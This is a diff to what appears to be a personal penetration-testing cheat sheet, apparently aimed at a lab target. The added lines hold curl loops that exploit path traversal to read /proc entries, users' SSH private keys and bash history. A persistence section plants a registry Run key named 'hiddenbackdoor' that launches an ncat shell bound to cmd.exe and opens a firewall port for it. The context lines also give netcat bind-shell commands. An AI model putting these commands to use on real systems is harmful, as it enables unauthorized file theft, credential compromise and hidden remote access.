@@ -23,6 +23,24 @@ gobuster -t 100 dir -w big.txt -u http://<host>
   
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/FUZZ -t 500
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/config/FUZZ -t 500 -mc 200
+
+#curl brute / fuzz manual
+while read line; do echo $line ; curl -s "http://10.10.11.154/index.php?page=/../../../..${line}"; done < fdbrute.txt
+
+#ENUM processes
+for i in {445..5000}; do echo $i >> procinfos.txt ;  curl -s "http://10.10.11.154/index.php?page=/../../../../proc/${i}/status" | wc -c >> procinfos.txt; done
+
+#curl wordcount
+curl -s "http://10.10.11.154/index.php?page=/../../../../proc/445/status" | wc -c
+
+# bash number iterate
+for i in {1000..5000}; do echo $i; curl -s "http://10.10.11.154/index.php?page=/../../../../proc/${i}/cmdline"; done
+
+# bash iterate list
+while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.ssh/id_rsa"; done < users.txt
+while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.bash_history"; done < users.txt
+
+
 ```
 
 EXPLOIT
@@ -104,6 +122,12 @@ echo $( php -r "echo urlencode(\"$1\");"; )
 urlencode.sh 'string zum encodieren'
 ```
 
+PERSISTENCE
+```bash
+# netcat run registry
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v hiddenbackdoor /d "C:\Program Files (x86)\Nmap\ncat.exe -lnp 4445 -e cmd.exe"
+netsh advfirewall firewall add rule name="hiddenbackdoor" dir=in action=allow protocol=TCP localport=4445
+```
 
 NETCAT STUFF
 ```bash
@@ -133,4 +157,16 @@ echo "" | nc -zv -wl [host] [port range] grab banner
 Netcat-Backdoor-Shells
 nc -l -p [port] -e /bin/bash
 nc -l -p [port] -e cmd.exe
+```
+
+BASH, SETUP and Prep Stuff
+```
+# vim visual mode
+vim disable visual mode
+:set mouse-=a
+```
+
+REFS
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings
 ```
